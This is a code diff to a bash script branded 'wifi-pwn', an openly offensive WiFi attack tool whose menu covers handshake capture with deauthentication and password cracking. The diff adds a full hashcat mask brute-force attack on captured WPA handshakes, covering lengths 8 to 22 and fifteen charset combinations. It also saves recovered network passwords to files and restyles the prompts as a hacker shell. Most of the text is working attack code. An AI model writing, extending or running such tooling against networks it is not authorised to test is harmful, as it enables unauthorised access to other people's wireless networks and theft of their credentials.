@@ -10,6 +10,20 @@ DARK=$'\033[0;37m'
 BOLD=$'\033[1m'
 NC=$'\033[0m'
 
+hacker_read() {
+    local var_name="$1"
+    local prompt_text="$2"
+    if [[ -n "$prompt_text" ]]; then
+        echo -e "$prompt_text"
+    fi
+    echo -ne "${GREEN}[${WHITE}root${GREEN}@${RED}wifi-pwn${GREEN}]~# ${NC}"
+    if [[ -n "$var_name" ]]; then
+        read "$var_name"
+    else
+        read
+    fi
+}
+
 banner() {
     clear
     echo -e "${GREEN}"
@@ -60,9 +74,9 @@ select_interface() {
         exit 1
     elif [[ ${#INTERFACES[@]} -eq 1 ]]; then
         echo -e "${GREEN}[+] Found 1 wireless interface: ${INTERFACES[0]}${NC}"
-        read -rp "$(echo -e $CYAN)[?] Use ${INTERFACES[0]}? (Y/n): ${NC}" CONFIRM
+        hacker_read CONFIRM "${CYAN}[?] Use ${INTERFACES[0]}? (Y/n):${NC}"
         if [[ "$CONFIRM" == "n" || "$CONFIRM" == "N" ]]; then
-            read -rp "$(echo -e $CYAN)[?] Enter wireless interface name manually: ${NC}" INTERFACE
+            hacker_read INTERFACE "${CYAN}[?] Enter wireless interface name manually:${NC}"
         else
             INTERFACE="${INTERFACES[0]}"
         fi
@@ -74,7 +88,7 @@ select_interface() {
             ((idx++))
         done
         echo ""
-        read -rp "$(echo -e $CYAN)[?] Select interface number or enter name manually: ${NC}" CHOICE
+        hacker_read CHOICE "${CYAN}[?] Select interface number or enter name manually:${NC}"
         if [[ "$CHOICE" =~ ^[0-9]+$ ]] && (( CHOICE >= 1 && CHOICE <= ${#INTERFACES[@]} )); then
             INTERFACE="${INTERFACES[$((CHOICE-1))]}"
         else
@@ -143,7 +157,7 @@ scan_networks() {
         fi
 
         echo ""
-        read -rp "$(echo -e $CYAN)[?] Enter target BSSID to select, or press Enter to scan again (+10s): ${NC}" USER_BSSID
+        hacker_read USER_BSSID "${CYAN}[?] Enter target BSSID (or press Enter to scan again):${NC}"
 
         if [[ -n "$USER_BSSID" ]]; then
             BSSID=$(echo "$USER_BSSID" | tr -d ' ' | tr '[:lower:]' '[:upper:]')
@@ -226,7 +240,7 @@ SCANEOF2
         fi
 
         echo ""
-        read -rp "$(echo -e $CYAN)[?] Enter target BSSID to select, or press Enter to scan again (+10s): ${NC}" USER_BSSID
+        hacker_read USER_BSSID "${CYAN}[?] Enter target BSSID (or press Enter to scan again):${NC}"
 
         if [[ -n "$USER_BSSID" ]]; then
             BSSID=$(echo "$USER_BSSID" | tr -d ' ' | tr '[:lower:]' '[:upper:]')
@@ -271,15 +285,15 @@ set_target() {
     list_existing_caps
 
     if [[ -z "$BSSID" ]]; then
-        read -rp "$(echo -e $CYAN)[?] Enter target BSSID (e.g., 00:11:22:33:44:55): ${NC}" BSSID
+        hacker_read BSSID "${CYAN}[?] Enter target BSSID (e.g., 00:11:22:33:44:55):${NC}"
     fi
     if [[ -z "$CHANNEL" ]]; then
-        read -rp "$(echo -e $CYAN)[?] Enter target channel: ${NC}" CHANNEL
+        hacker_read CHANNEL "${CYAN}[?] Enter target channel:${NC}"
     fi
 
     DEFAULT_NAME="capture"
     SUGGESTED=$(generate_filename "$DEFAULT_NAME")
-    read -rp "$(echo -e $CYAN)[?] Enter capture file name [${SUGGESTED}]: ${NC}" CAP_INPUT
+    hacker_read CAP_INPUT "${CYAN}[?] Enter capture file name [${SUGGESTED}]:${NC}"
     if [[ -z "$CAP_INPUT" ]]; then
         CAP_INPUT="$SUGGESTED"
     fi
@@ -425,7 +439,7 @@ SCRIPTEOF
     echo -e "${GREEN}[>]${NC} ${WHITE}Check it for handshake capture progress.${NC}"
     echo -e "${GREEN}[>]${NC} ${WHITE}When the handshake is captured, press ENTER here to continue.${NC}"
     echo ""
-    read -rp "$(printf "${GREEN}[${WHITE}ENTER${GREEN}]${NC} Press ENTER when handshake is captured: ")" CONFIRM
+    hacker_read "" "${GREEN}[${WHITE}ENTER${GREEN}]${NC} Press ENTER when handshake is captured:"
 
     if [[ -f "$PID_FILE" ]]; then
         while read PID; do
@@ -502,20 +516,327 @@ prepare_wordlist() {
         WORDLIST="$ROCKY_OUT"
     else
         echo -e "${RED}[!] Could not locate or install rockyou.txt${NC}"
-        read -rp "$(echo -e $CYAN)[?] Enter path to wordlist manually: ${NC}" WORDLIST
+        hacker_read WORDLIST "${CYAN}[?] Enter path to wordlist manually:${NC}"
     fi
 }
 
-bruteforce_crack() {
+mask_attack() {
+    setup_output_dir
+
+    local CAP_FILE=$(ls -t "$CAP_FILE_PATH"/*.cap 2>/dev/null | head -1)
+    if [[ -z "$CAP_FILE" ]]; then
+        echo -e "${RED}[!] No .cap files found. Capture a handshake first.${NC}"
+        return 1
+    fi
+    echo -e "${GREEN}[+] Using capture: ${WHITE}$(basename "$CAP_FILE")${NC}"
+
+    if ! command -v hashcat &>/dev/null; then
+        echo -e "${YELLOW}[*] Installing hashcat...${NC}"
+        apt-get install -y hashcat 2>/dev/null
+    fi
+
+    echo -e "${YELLOW}[*] Checking for WPA handshake in capture...${NC}"
+    local HANDSHAKE_CHECK=$(aircrack-ng "$CAP_FILE" 2>&1 | grep -c "1 handshake")
+    if [[ "$HANDSHAKE_CHECK" -eq 0 ]]; then
+        echo -e "${RED}[!] No WPA handshake found in capture file.${NC}"
+        echo -e "${YELLOW}[*] Capture the handshake first using option 4.${NC}"
+        return 1
+    fi
+    echo -e "${GREEN}[+] WPA handshake confirmed.${NC}"
+
+    local HCCAPX="${CAP_FILE%.cap}.hccapx"
+    local HC22000="${CAP_FILE%.cap}.22000"
+    local HASH_FILE=""
+    local HASH_MODE=""
+
+    if command -v hcxpcapngtool &>/dev/null; then
+        echo -e "${YELLOW}[*] Converting using hcxpcapngtool (22000 format)...${NC}"
+        hcxpcapngtool -o "$HC22000" "$CAP_FILE" 2>&1
+        if [[ -f "$HC22000" && -s "$HC22000" ]]; then
+            HASH_FILE="$HC22000"
+            HASH_MODE="22000"
+            echo -e "${GREEN}[+] Converted: ${WHITE}$(basename "$HC22000")${NC}"
+        fi
+    fi
+
+    if [[ -z "$HASH_FILE" ]]; then
+        if ! command -v cap2hccapx &>/dev/null; then
+            echo -e "${YELLOW}[*] Installing hcxtools...${NC}"
+            apt-get install -y hcxtools 2>/dev/null
+        fi
+        if command -v cap2hccapx &>/dev/null; then
+            echo -e "${YELLOW}[*] Converting using cap2hccapx (hccapx format)...${NC}"
+            cap2hccapx "$CAP_FILE" "$HCCAPX"
+            if [[ -f "$HCCAPX" ]]; then
+                HASH_FILE="$HCCAPX"
+                HASH_MODE="2500"
+                echo -e "${GREEN}[+] Converted: ${WHITE}$(basename "$HCCAPX")${NC}"
+            fi
+        fi
+    fi
+
+    if [[ -z "$HASH_FILE" ]]; then
+        echo -e "${RED}[!] Conversion failed. Could not convert capture to hashcat format.${NC}"
+        return 1
+    fi
+
+    local GLOBAL_DONE=false
+    local MIN_LEN=8
+    local MAX_LEN=22
+
     echo ""
-    echo -e "${RED}======================================================================${NC}"
-    echo -e "${RED}  BRUTE FORCE: UNDER DEVELOPMENT${NC}"
-    echo -e "${RED}  This feature is currently under development.${NC}"
-    echo -e "${RED}  It will be available in a future update.${NC}"
-    echo -e "${RED}======================================================================${NC}"
+    echo -e "${CYAN}╔═══════════════════════════════════════════════════════════╗${NC}"
+    echo -e "${CYAN}║${NC}              ${YELLOW}SET PASSWORD LENGTH RANGE${NC}                         ${CYAN}║${NC}"
+    echo -e "${CYAN}╚═══════════════════════════════════════════════════════════╝${NC}"
     echo ""
-    read -rp "$(echo -e $CYAN)[?] Press Enter to continue...${NC}"
-    return 1
+    hacker_read MIN_LEN "${YELLOW}[*]${NC} Minimum password length ${DARK}(default: 8)${NC}:"
+    MIN_LEN="${MIN_LEN:-8}"
+    hacker_read MAX_LEN "${YELLOW}[*]${NC} Maximum password length ${DARK}(default: 22)${NC}:"
+    MAX_LEN="${MAX_LEN:-22}"
+    echo -e "${GREEN}[+]${NC} Length range: ${WHITE}${MIN_LEN}-${MAX_LEN}${NC} characters"
+    echo ""
+
+    while [[ "$GLOBAL_DONE" == false ]]; do
+        local CHARSET_LABEL=""
+        local CHARSET_BUILTIN=""
+        local CUSTOM_CHARSET=""
+
+        echo ""
+        echo -e "${CYAN}╔═══════════════════════════════════════════════════════════╗${NC}"
+        echo -e "${CYAN}║${NC}              ${YELLOW}SELECT CHARACTER COMBINATION${NC}                   ${CYAN}║${NC}"
+        echo -e "${CYAN}╚═══════════════════════════════════════════════════════════╝${NC}"
+        echo ""
+        echo -e "  ${GREEN}1${NC})  Uppercase only           ${DARK}(A-Z)${NC}"
+        echo -e "  ${GREEN}2${NC})  Lowercase only           ${DARK}(a-z)${NC}"
+        echo -e "  ${GREEN}3${NC})  Digits only               ${DARK}(0-9)${NC}"
+        echo -e "  ${GREEN}4${NC})  Special only              ${DARK}(!@#...)${NC}"
+        echo -e "  ${GREEN}5${NC})  U + L                    ${DARK}(A-Z + a-z)${NC}"
+        echo -e "  ${GREEN}6${NC})  U + D                    ${DARK}(A-Z + 0-9)${NC}"
+        echo -e "  ${GREEN}7${NC})  U + S                    ${DARK}(A-Z + !@#...)${NC}"
+        echo -e "  ${GREEN}8${NC})  L + D                    ${DARK}(a-z + 0-9)${NC}"
+        echo -e "  ${GREEN}9${NC})  L + S                    ${DARK}(a-z + !@#...)${NC}"
+        echo -e "  ${GREEN}10${NC}) D + S                    ${DARK}(0-9 + !@#...)${NC}"
+        echo -e "  ${GREEN}11${NC}) U + L + D                ${DARK}(A-Z a-z 0-9)${NC}"
+        echo -e "  ${GREEN}12${NC}) U + L + S                ${DARK}(A-Z a-z !@#...)${NC}"
+        echo -e "  ${GREEN}13${NC}) U + D + S                ${DARK}(A-Z 0-9 !@#...)${NC}"
+        echo -e "  ${GREEN}14${NC}) L + D + S                ${DARK}(a-z 0-9 !@#...)${NC}"
+        echo -e "  ${GREEN}15${NC}) U + L + D + S            ${DARK}(All 4 categories)${NC}"
+        echo ""
+        echo -e "  ${RED}q${NC}) Quit mask attack"
+        echo ""
+        hacker_read CHARSET_CHOICE "${CYAN}[?]${NC} Select ${DARK}(1-15 or q)${NC}:"
+
+        case "$CHARSET_CHOICE" in
+            1)  CHARSET_LABEL="Uppercase (A-Z)";         CHARSET_BUILTIN="u"; CUSTOM_CHARSET="" ;;
+            2)  CHARSET_LABEL="Lowercase (a-z)";         CHARSET_BUILTIN="l"; CUSTOM_CHARSET="" ;;
+            3)  CHARSET_LABEL="Digits (0-9)";             CHARSET_BUILTIN="d"; CUSTOM_CHARSET="" ;;
+            4)  CHARSET_LABEL="Special (!@#...)";         CHARSET_BUILTIN="s"; CUSTOM_CHARSET="" ;;
+            5)  CHARSET_LABEL="U + L";                    CHARSET_BUILTIN="";  CUSTOM_CHARSET="?u?l" ;;
+            6)  CHARSET_LABEL="U + D";                    CHARSET_BUILTIN="";  CUSTOM_CHARSET="?u?d" ;;
+            7)  CHARSET_LABEL="U + S";                    CHARSET_BUILTIN="";  CUSTOM_CHARSET="?u?s" ;;
+            8)  CHARSET_LABEL="L + D";                    CHARSET_BUILTIN="";  CUSTOM_CHARSET="?l?d" ;;
+            9)  CHARSET_LABEL="L + S";                    CHARSET_BUILTIN="";  CUSTOM_CHARSET="?l?s" ;;
+            10) CHARSET_LABEL="D + S";                    CHARSET_BUILTIN="";  CUSTOM_CHARSET="?d?s" ;;
+            11) CHARSET_LABEL="U + L + D";                CHARSET_BUILTIN="";  CUSTOM_CHARSET="?u?l?d" ;;
+            12) CHARSET_LABEL="U + L + S";                CHARSET_BUILTIN="";  CUSTOM_CHARSET="?u?l?s" ;;
+            13) CHARSET_LABEL="U + D + S";                CHARSET_BUILTIN="";  CUSTOM_CHARSET="?u?d?s" ;;
+            14) CHARSET_LABEL="L + D + S";                CHARSET_BUILTIN="";  CUSTOM_CHARSET="?l?d?s" ;;
+            15) CHARSET_LABEL="U + L + D + S";            CHARSET_BUILTIN="";  CUSTOM_CHARSET="?u?l?d?s" ;;
+            q|Q) echo -e "${YELLOW}[*] Mask attack cancelled.${NC}"; return 0 ;;
+            *) echo -e "${RED}[!] Invalid option${NC}"; continue ;;
+        esac
+
+        echo -e "${GREEN}[+] Selected: ${WHITE}$CHARSET_LABEL${NC}"
+
+        echo ""
+        echo -e "${RED}╔═══════════════════════════════════════════════════════════╗${NC}"
+        echo -e "${RED}║${NC}  ${YELLOW}⚠ WARNING:${NC} Mask/brute-force attack is extremely                 ${RED}║${NC}"
+        echo -e "${RED}║${NC}  ${YELLOW}time-consuming!${NC} It can take from hours to YEARS                  ${RED}║${NC}"
+        echo -e "${RED}║${NC}  depending on password complexity and your hardware.                           ${RED}║${NC}"
+        echo -e "${RED}║${NC}                                                                               ${RED}║${NC}"
+        echo -e "${RED}║${NC}  ${WHITE}Character set:${NC} $CHARSET_LABEL                                       ${RED}║${NC}"
+        echo -e "${RED}║${NC}  ${WHITE}Length range:${NC}  ${MIN_LEN}-${MAX_LEN} characters                                       ${RED}║${NC}"
+        echo -e "${RED}║${NC}                                                                               ${RED}║${NC}"
+        echo -e "${RED}║${NC}  ${WHITE}Tip:${NC} A wordlist attack (option 5) is much faster.                    ${RED}║${NC}"
+        echo -e "${RED}╚═══════════════════════════════════════════════════════════╝${NC}"
+        echo ""
+        hacker_read PROCEED "${CYAN}[?]${NC} Start attack with this charset? ${DARK}(y/n)${NC}:"
+        if [[ "$PROCEED" != "y" && "$PROCEED" != "Y" ]]; then
+            echo -e "${YELLOW}[*] Skipped this charset.${NC}"
+            continue
+        fi
+
+        local MASK_SCRIPT="/tmp/wifi_mask_$$.sh"
+        local RESULT_FILE="/tmp/wifi_mask_result_$$"
+
+        cat > "$MASK_SCRIPT" << MASKEOF
+#!/bin/bash
+HASH_FILE="$HASH_FILE"
+HASH_MODE="$HASH_MODE"
+CHARSET_BUILTIN="$CHARSET_BUILTIN"
+CUSTOM_CHARSET="$CUSTOM_CHARSET"
+CHARSET_LABEL="$CHARSET_LABEL"
+RESULT_FILE="$RESULT_FILE"
+MIN_LEN="$MIN_LEN"
+MAX_LEN="$MAX_LEN"
+
+GREEN='\033[0;32m'
+YELLOW='\033[1;33m'
+RED='\033[0;31m'
+CYAN='\033[0;36m'
+NC='\033[0m'
+
+clear
+echo -e "\${CYAN}╔══════════════════════════════════════════╗\${NC}"
+echo -e "\${CYAN}║\${NC}  \${YELLOW}⚡\${NC} HASHCAT MASK ATTACK \${YELLOW}⚡\${NC}               \${CYAN}║\${NC}"
+echo -e "\${CYAN}╚══════════════════════════════════════════╝\${NC}"
+echo ""
+echo -e "\${YELLOW}[*]\${NC} Target:      \${GREEN}\$HASH_FILE\${NC}"
+echo -e "\${YELLOW}[*]\${NC} Mode:        \${GREEN}-m \$HASH_MODE\${NC}"
+echo -e "\${YELLOW}[*]\${NC} Charset:     \${GREEN}\$CHARSET_LABEL\${NC}"
+echo ""
+
+for ((i=\${MIN_LEN}; i<=\${MAX_LEN}; i++)); do
+    MASK=""
+    for ((j=0; j<i; j++)); do
+        if [[ -n "\$CUSTOM_CHARSET" ]]; then
+            MASK="\${MASK}?1"
+        else
+            MASK="\${MASK}?\$CHARSET_BUILTIN"
+        fi
+    done
+
+    echo -e "\${YELLOW}[*] Trying length: \${GREEN}\${i}\${NC} characters [\${CHARSET_LABEL}]"
+    echo -e "\${YELLOW}[*] Mask: \${GREEN}\${MASK}\${NC}"
+    echo ""
+
+    if [[ -n "\$CUSTOM_CHARSET" ]]; then
+        hashcat -m "\$HASH_MODE" -a 3 -w 3 -1 "\$CUSTOM_CHARSET" "\$HASH_FILE" "\$MASK" 2>&1
+    else
+        hashcat -m "\$HASH_MODE" -a 3 -w 3 "\$HASH_FILE" "\$MASK" 2>&1
+    fi
+
+    echo ""
+    FOUND_LINE=\$(hashcat -m "\$HASH_MODE" --show "\$HASH_FILE" 2>/dev/null | head -1)
+
+    if [[ -n "\$FOUND_LINE" ]]; then
+        PASS_DIR=\$(dirname "\$HASH_FILE")
+        PASS_FILE="\$PASS_DIR/password_mask_attack.txt"
+        PASSWORD="\${FOUND_LINE##*:}"
+        if [[ "\$HASH_FILE" == *.22000 ]]; then
+            ESSID=\$(head -1 "\$HASH_FILE" | cut -d'*' -f6)
+        else
+            ESSID="Unknown"
+        fi
+        echo "Network: \$ESSID" > "\$PASS_FILE"
+        echo "Password: \$PASSWORD" >> "\$PASS_FILE"
+        echo ""
+        echo -e "\${GREEN}[+] PASSWORD FOUND!\${NC}"
+        echo -e "\${GREEN}[+] Password: \${PASSWORD}\${NC}"
+        echo -e "\${YELLOW}[*] Saved to: \$PASS_FILE\${NC}"
+        echo -e "\${YELLOW}[*] Close this window manually when done.\${NC}"
+        echo ""
+        echo "FOUND" > "\$RESULT_FILE"
+        echo ""
+        echo -e "\${GREEN}[\${WHITE}root\${GREEN}@\${RED}wifi-pwn\${GREEN}]~# \${NC}"
+        read DUMMY
+        exit 0
+    fi
+
+    echo ""
+    echo -e "\${YELLOW}[*] Password not found for length \${i}.\${NC}"
+    echo ""
+    local NEXT=\$((i+1))
+    if [[ \$NEXT -gt \$MAX_LEN ]]; then
+        echo -e "\${YELLOW}[*] Reached maximum length (\$MAX_LEN). Moving to next charset.\${NC}"
+        break
+    fi
+    echo -e "\${CYAN}[?]\${NC} Try length \${NEXT}? \${DARK}(Y/n)\${NC}:"
+    echo -ne "\${GREEN}[\${WHITE}root\${GREEN}@\${RED}wifi-pwn\${GREEN}]~# \${NC}"
+    read CONTINUE
+
+    if [[ "\$CONTINUE" == "n" || "\$CONTINUE" == "N" ]]; then
+        echo ""
+        echo -e "\${YELLOW}[*] Mask attack stopped by user.\${NC}"
+        echo "STOPPED" > "\$RESULT_FILE"
+        echo ""
+        echo -e "\${GREEN}[\${WHITE}root\${GREEN}@\${RED}wifi-pwn\${GREEN}]~# \${NC}"
+        read DUMMY
+        exit 0
+    fi
+    echo ""
+done
+
+echo -e "\${RED}[!] All lengths \$MIN_LEN-\$MAX_LEN tested for this charset.\${NC}"
+echo "NOT_FOUND" > "\$RESULT_FILE"
+echo ""
+echo -e "\${GREEN}[\${WHITE}root\${GREEN}@\${RED}wifi-pwn\${GREEN}]~# \${NC}"
+read DUMMY
+MASKEOF
+        chmod +x "$MASK_SCRIPT"
+
+        local TERMINAL=$(detect_terminal)
+        case "$TERMINAL" in
+            gnome-terminal)
+                gnome-terminal -- bash -c "\"$MASK_SCRIPT\"" 2>/dev/null &
+                ;;
+            konsole)
+                konsole --hold -e "$MASK_SCRIPT" 2>/dev/null &
+                ;;
+            x-terminal-emulator|xterm|xfce4-terminal|lxterminal|mate-terminal|terminator|urxvt|rxvt)
+                $TERMINAL -e "$MASK_SCRIPT" 2>/dev/null &
+                ;;
+            *)
+                echo -e "${YELLOW}[*] No GUI terminal found, installing xterm...${NC}"
+                apt-get install -y xterm 2>/dev/null
+                if command -v xterm &>/dev/null; then
+                    xterm -e "$MASK_SCRIPT" 2>/dev/null &
+                else
+                    echo -e "${YELLOW}[*] Running mask attack in background...${NC}"
+                    bash "$MASK_SCRIPT" &
+                fi
+                ;;
+        esac
+
+        echo ""
+        echo -e "${GREEN}[>]${NC} ${WHITE}A new terminal has opened for Hashcat Mask Attack.${NC}"
+        echo -e "${GREEN}[>]${NC} ${WHITE}Testing lengths ${MIN_LEN}-${MAX_LEN} with:${NC} $CHARSET_LABEL"
+        echo ""
+
+        while [[ ! -f "$RESULT_FILE" ]]; do
+            sleep 1
+        done
+
+        local RESULT=$(cat "$RESULT_FILE" 2>/dev/null)
+        rm -f "$RESULT_FILE" "$MASK_SCRIPT" 2>/dev/null
+
+        if [[ "$RESULT" == "FOUND" ]]; then
+            echo -e "${GREEN}[+] PASSWORD FOUND! Saved to: ${WHITE}$OUTPUT_DIR/password_mask_attack.txt${NC}"
+            GLOBAL_DONE=true
+        else
+            if [[ "$RESULT" == "STOPPED" ]]; then
+                echo -e "${YELLOW}[*] Mask attack stopped by user.${NC}"
+            else
+                echo -e "${YELLOW}[*] Password not found with this charset.${NC}"
+            fi
+
+            echo ""
+            hacker_read EXTEND "${CYAN}[?]${NC} Extend max length beyond ${WHITE}${MAX_LEN}${NC}? ${DARK}(Y/n)${NC}:"
+            if [[ "$EXTEND" != "n" && "$EXTEND" != "N" && -n "$EXTEND" ]]; then
+                local SUGGESTED_MAX=$((MAX_LEN + 1))
+                hacker_read MAX_LEN "${YELLOW}[*]${NC} New max length ${DARK}(default: ${SUGGESTED_MAX})${NC}:"
+                MAX_LEN="${MAX_LEN:-$SUGGESTED_MAX}"
+                echo -e "${GREEN}[+]${NC} Extended range: ${WHITE}${MIN_LEN}-${MAX_LEN}${NC} chars"
+                echo ""
+            fi
+
+            echo ""
+            hacker_read TRY_AGAIN "${CYAN}[?]${NC} Try a different charset? ${DARK}(Y/n)${NC}:"
+            if [[ "$TRY_AGAIN" == "n" || "$TRY_AGAIN" == "N" ]]; then
+                GLOBAL_DONE=true
+            fi
+        fi
+    done
 }
 
 crack_password() {
@@ -567,6 +888,7 @@ crack_password_terminal() {
 
     local CRACK_SCRIPT="/tmp/wifi_crack_$$.sh"
     local RESULT_FILE="/tmp/wifi_crack_result_$$"
+    local PASS_FILE="$CAP_FILE_PATH/password_cracked.txt"
 
     cat > "$CRACK_SCRIPT" << 'CRACKEOF'
 #!/bin/bash
@@ -574,6 +896,7 @@ CAPTURE="$1"
 WORDLIST="$2"
 RESULT_FILE="$3"
 ME="$4"
+PASS_FILE="$5"
 OUT_FILE="/tmp/crack_out_$$"
 
 GREEN='\033[0;32m'
@@ -605,7 +928,9 @@ while kill -0 $CRACK_PID 2>/dev/null; do
         echo -e "${RED}[!] Stopped by user.${NC}"
         echo "STOPPED" > "$RESULT_FILE"
         rm -f "$ME" "$OUT_FILE"
-        sleep 2
+        echo ""
+        echo -e "${GREEN}[${WHITE}root${GREEN}@${RED}wifi-pwn${GREEN}]~# ${NC}"
+        read
         exit
     fi
 done
@@ -615,6 +940,11 @@ echo ""
 if grep -q "KEY FOUND" "$OUT_FILE" 2>/dev/null; then
     FOUND=$(grep "KEY FOUND" "$OUT_FILE" | head -1)
     echo -e "${GREEN}[+] $FOUND${NC}"
+    PASSWORD=$(echo "$FOUND" | sed 's/.*\[ *\(.*\) *\].*/\1/')
+    ESSID=$(aircrack-ng "$CAPTURE" 2>/dev/null | awk 'NR>=4 && /^[[:space:]]*[0-9]/ {for(i=3;i<=NF-3;i++) printf "%s%s", $i, (i<NF-3?FS:""); print ""; exit}')
+    echo "Network: $ESSID" > "$PASS_FILE"
+    echo "Password: $PASSWORD" >> "$PASS_FILE"
+    echo -e "${YELLOW}[*] Password saved to: $PASS_FILE${NC}"
     echo "FOUND" > "$RESULT_FILE"
 else
     echo -e "${RED}[!] Password not found in wordlist${NC}"
@@ -622,7 +952,9 @@ else
 fi
 
 rm -f "$ME" "$OUT_FILE"
-sleep 5
+echo ""
+echo -e "${GREEN}[${WHITE}root${GREEN}@${RED}wifi-pwn${GREEN}]~# ${NC}"
+read
 CRACKEOF
     chmod +x "$CRACK_SCRIPT"
 
@@ -630,22 +962,22 @@ CRACKEOF
 
     case "$TERMINAL" in
         gnome-terminal)
-            gnome-terminal -- bash -c "\"$CRACK_SCRIPT\" \"$CAPTURE_FILE\" \"$WORDLIST\" \"$RESULT_FILE\" \"$CRACK_SCRIPT\"" 2>/dev/null &
+            gnome-terminal -- bash -c "\"$CRACK_SCRIPT\" \"$CAPTURE_FILE\" \"$WORDLIST\" \"$RESULT_FILE\" \"$CRACK_SCRIPT\" \"$PASS_FILE\"" 2>/dev/null &
             ;;
         konsole)
-            konsole --hold -e "$CRACK_SCRIPT" "$CAPTURE_FILE" "$WORDLIST" "$RESULT_FILE" "$CRACK_SCRIPT" 2>/dev/null &
+            konsole --hold -e "$CRACK_SCRIPT" "$CAPTURE_FILE" "$WORDLIST" "$RESULT_FILE" "$CRACK_SCRIPT" "$PASS_FILE" 2>/dev/null &
             ;;
         x-terminal-emulator|xterm|xfce4-terminal|lxterminal|mate-terminal|terminator|urxvt|rxvt)
-            $TERMINAL -e "$CRACK_SCRIPT" "$CAPTURE_FILE" "$WORDLIST" "$RESULT_FILE" "$CRACK_SCRIPT" 2>/dev/null &
+            $TERMINAL -e "$CRACK_SCRIPT" "$CAPTURE_FILE" "$WORDLIST" "$RESULT_FILE" "$CRACK_SCRIPT" "$PASS_FILE" 2>/dev/null &
             ;;
         *)
             echo -e "${YELLOW}[*] No GUI terminal found, installing xterm...${NC}"
             apt-get install -y xterm 2>/dev/null
             if command -v xterm &>/dev/null; then
-                xterm -e "$CRACK_SCRIPT" "$CAPTURE_FILE" "$WORDLIST" "$RESULT_FILE" "$CRACK_SCRIPT" 2>/dev/null &
+                xterm -e "$CRACK_SCRIPT" "$CAPTURE_FILE" "$WORDLIST" "$RESULT_FILE" "$CRACK_SCRIPT" "$PASS_FILE" 2>/dev/null &
             else
                 echo -e "${YELLOW}[*] Running crack in background...${NC}"
-                bash "$CRACK_SCRIPT" "$CAPTURE_FILE" "$WORDLIST" "$RESULT_FILE" "$CRACK_SCRIPT" &
+                bash "$CRACK_SCRIPT" "$CAPTURE_FILE" "$WORDLIST" "$RESULT_FILE" "$CRACK_SCRIPT" "$PASS_FILE" &
             fi
             ;;
     esac
@@ -664,8 +996,8 @@ CRACKEOF
 
     if [[ "$RESULT" == "FOUND" ]]; then
         echo ""
-        echo -e "${GREEN}[+] Password found! Press ENTER to continue.${NC}"
-        read -rp "$(printf "${GREEN}[${WHITE}ENTER${GREEN}]${NC} Press ENTER to continue: ")" _
+        echo -e "${GREEN}[+] Password found! Saved to: ${WHITE}$PASS_FILE${NC}"
+        hacker_read "" "${GREEN}[${WHITE}ENTER${GREEN}]${NC} Press ENTER to continue:"
     elif [[ "$RESULT" == "STOPPED" ]]; then
         echo ""
         echo -e "${YELLOW}[*] Cracking was stopped by user.${NC}"
@@ -728,7 +1060,7 @@ main_menu() {
         echo -e "${DARK}│${NC}  ${GREEN}[4]${NC}  CAPTURE HANDSHAKE — Set target & deauth           ${DARK}│${NC}"
         echo -e "${DARK}│${NC}  ${GREEN}[5]${NC}  CRACK PASSWORD                                    ${DARK}│${NC}"
         echo -e "${DARK}│${NC}  ${GREEN}[6]${NC}  CLEANUP — Stop monitor & restart network          ${DARK}│${NC}"
-        echo -e "${DARK}│${NC}  ${GREEN}[7]${NC}  BRUTE FORCE (Under Development)                  ${DARK}│${NC}"
+        echo -e "${DARK}│${NC}  ${GREEN}[7]${NC}  MASK ATTACK — Hashcat Auto (8-22 chars)            ${DARK}│${NC}"
         echo -e "${DARK}│${NC}  ${RED}[8]${NC}  EXIT                                             ${DARK}│${NC}"
         echo -e "${DARK}└──────────────────────────────────────────────────────────────┘${NC}"
         echo ""
@@ -748,25 +1080,25 @@ main_menu() {
                 prepare_wordlist
                 crack_password_terminal
                 echo -e "${GREEN}[+] Full automation complete${NC}"
-                read -rp "Press Enter to continue..."
+                hacker_read "" "Press ENTER to continue:"
                 ;;
             2)
                 select_interface
                 kill_interfering
                 enable_monitor
-                read -rp "Press Enter to continue..."
+                hacker_read "" "Press ENTER to continue:"
                 ;;
             3)
                 [[ -z "$MON_INTERFACE" ]] && { select_interface; kill_interfering; enable_monitor; }
                 scan_networks
-                read -rp "Press Enter to continue..."
+                hacker_read "" "Press ENTER to continue:"
                 ;;
             4)
                 setup_output_dir
                 [[ -z "$MON_INTERFACE" ]] && select_interface
                 set_target
                 capture_and_deauth
-                read -rp "Press Enter to continue..."
+                hacker_read "" "Press ENTER to continue:"
                 ;;
             5)
                 setup_output_dir
@@ -774,21 +1106,21 @@ main_menu() {
                 CAPTURE_FILE=$(ls -t "$CAP_FILE_PATH"/*.cap 2>/dev/null | head -1)
                 if [[ -z "$CAPTURE_FILE" ]]; then
                     echo -e "${RED}[!] No .cap files found in output folder${NC}"
-                    read -rp "Press Enter to continue..."
+                    hacker_read "" "Press ENTER to continue:"
                     continue
                 fi
                 echo -e "${GREEN}[+] Using latest capture: ${WHITE}$(basename "$CAPTURE_FILE")${NC}"
                 prepare_wordlist
                 crack_password_terminal
-                read -rp "Press Enter to continue..."
+                hacker_read "" "Press ENTER to continue:"
                 ;;
             6)
                 restart_network
-                read -rp "Press Enter to continue..."
+                hacker_read "" "Press ENTER to continue:"
                 ;;
             7)
-                bruteforce_crack
-                read -rp "Press Enter to continue..."
+                mask_attack
+                hacker_read "" "Press ENTER to continue:"
                 ;;
             8)
                 echo -e "${GREEN}[+] Exiting${NC}"
@@ -796,7 +1128,7 @@ main_menu() {
                 ;;
             *)
                 echo -e "${RED}[!] Invalid option${NC}"
-                read -rp "Press Enter to continue..."
+                hacker_read "" "Press ENTER to continue:"
                 ;;
         esac
     done
